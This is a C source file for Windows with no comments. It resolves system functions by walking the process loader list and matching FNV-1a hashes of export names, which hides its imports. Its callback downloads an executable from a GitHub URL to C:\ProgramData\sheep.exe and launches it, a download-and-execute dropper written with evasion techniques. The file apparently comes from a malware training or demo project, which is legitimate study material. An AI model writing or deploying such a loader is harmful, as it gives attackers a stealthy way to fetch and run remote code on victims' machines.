#include <stdint.h>
#include <windows.h>
#include <winternl.h>

typedef struct FULL_PEB_LDR_DATA
{
   ULONG Length;
   BOOLEAN Initialized;
   HANDLE SsHandle;
   LIST_ENTRY InLoadOrderModuleList;
   LIST_ENTRY InMemoryOrderModuleList;
   LIST_ENTRY InInitializationOrderModuleList;
   PVOID EntryInProgress;
   BOOLEAN ShutdownInProgress;
   HANDLE ShutdownThreadId;
} FULL_PEB_LDR_DATA, *PFULL_PEB_LDR_DATA;

typedef struct FULL_LDR_DATA_TABLE_ENTRY
{
     LIST_ENTRY InLoadOrderLinks;
     LIST_ENTRY InMemoryOrderLinks;
     LIST_ENTRY InInitializationOrderLinks;
     PVOID DllBase;
     PVOID EntryPoint;
     ULONG SizeOfImage;
     UNICODE_STRING FullDllName;
     UNICODE_STRING BaseDllName;
     ULONG Flags;
     WORD LoadCount;
     WORD TlsIndex;
     union
     {
          LIST_ENTRY HashLinks;
          struct
          {
               PVOID SectionPointer;
               ULONG CheckSum;
          };
     };
     union
     {
          ULONG TimeDateStamp;
          PVOID LoadedImports;
     };
     PVOID EntryPointActivationContext;
     PVOID PatchInformation;
     LIST_ENTRY ForwarderLinks;
     LIST_ENTRY ServiceTagLinks;
     LIST_ENTRY StaticLinks;
} FULL_LDR_DATA_TABLE_ENTRY, *PFULL_LDR_DATA_TABLE_ENTRY;

typedef HMODULE (* LoadLibraryAHeader)(LPCSTR);
typedef DWORD (* GetFileAttributesAHeader)(LPCSTR);
typedef HINSTANCE (*ShellExecuteAHeader)(HWND, LPCSTR, LPCSTR, LPCSTR, LPCSTR, INT);
typedef HRESULT (__stdcall *URLDownloadToFileHeader)(LPUNKNOWN, LPCSTR, LPCSTR, DWORD, LPBINDSTATUSCALLBACK);

uint32_t fnv321a(const char *string)
{
   uint32_t hashval = 0x811c9dc5;

   while (*string != 0)
   {
      hashval ^= *string++;
      hashval *= 0x1000193;
   }

   return hashval;
}

LPCVOID get_proc_by_hash(const PIMAGE_DOS_HEADER module, uint32_t hash)
{
   const IMAGE_NT_HEADERS *nt_headers = ((const IMAGE_NT_HEADERS *)((const uint8_t *)module)+module->e_lfanew);
   const IMAGE_EXPORT_DIRECTORY *export_directory = ((const IMAGE_EXPORT_DIRECTORY *)(
                                                        ((const uint8_t *)module)+nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress));
   const DWORD *name_pointers = ((const DWORD *)(((const uint8_t *)module)+export_directory->AddressOfNames));
   const WORD *name_ordinals = ((const WORD *)(((const uint8_t *)module)+export_directory->AddressOfNameOrdinals));
   const DWORD *functions = ((const DWORD *)(((const uint8_t *)module)+export_directory->AddressOfFunctions));

   for (uint32_t i=0; i<export_directory->NumberOfNames; ++i)
   {
      const char *name = ((const char *)(((const uint8_t *)module)+name_pointers[i]));

      if (fnv321a(name) != hash)
         continue;

      return ((LPCVOID)(((const uint8_t *)module)+functions[name_ordinals[i]]));
   }

   return nullptr;
}

void NTAPI callback(PVOID dllHandle, DWORD reason, PVOID reserved)
{
#if defined(_M_IX86)
   PPEB peb = ((PPEB)__readfsdword(0x30));
#elif defined(_M_AMD64)
   PPEB peb = ((PPEB)__readgsqword(0x60));
#endif

   PFULL_PEB_LDR_DATA ldr = ((PFULL_PEB_LDR_DATA)peb->Ldr);
   PFULL_LDR_DATA_TABLE_ENTRY list_entry = ((PFULL_LDR_DATA_TABLE_ENTRY)ldr->InLoadOrderModuleList.Flink);
   PFULL_LDR_DATA_TABLE_ENTRY kernel32 = ((PFULL_LDR_DATA_TABLE_ENTRY)(((PFULL_LDR_DATA_TABLE_ENTRY)list_entry->InLoadOrderLinks.Flink)->InLoadOrderLinks.Flink));
   LoadLibraryAHeader loadLibrary = ((LoadLibraryAHeader)get_proc_by_hash((PIMAGE_DOS_HEADER)kernel32->DllBase, 0x53b2070f));
   GetFileAttributesAHeader getFileAttributes = ((GetFileAttributesAHeader)get_proc_by_hash((PIMAGE_DOS_HEADER)kernel32->DllBase, 0xda1a7563));
   PIMAGE_DOS_HEADER urlmonModule = ((PIMAGE_DOS_HEADER)loadLibrary("urlmon.dll"));
   URLDownloadToFileHeader urlDownloadToFile = ((URLDownloadToFileHeader)get_proc_by_hash(urlmonModule, 0xd8d746fc));
   PIMAGE_DOS_HEADER shell32Module = ((PIMAGE_DOS_HEADER)loadLibrary("shell32.dll"));
   ShellExecuteAHeader shellExecute = ((ShellExecuteAHeader)get_proc_by_hash(shell32Module, 0xb0ff5bf));
   char sheep[] = "C:\\ProgramData\\sheep.exe";

   if (reason != DLL_PROCESS_ATTACH)
      return;
   
   if (getFileAttributes(sheep) == INVALID_FILE_ATTRIBUTES)
   {
      if (urlDownloadToFile(nullptr,
                            "https://github.com/frank2/blenny/raw/main/res/defaultpayload.exe",
                            sheep,
                            0,
                            nullptr) != 0)
         return;
   }

   shellExecute(nullptr, nullptr, sheep, nullptr, nullptr, 1);
}

int main(int argc, char *argv[])
{
   callback(hInstance, DLL_PROCESS_ATTACH, nullptr);
   return 0;
}
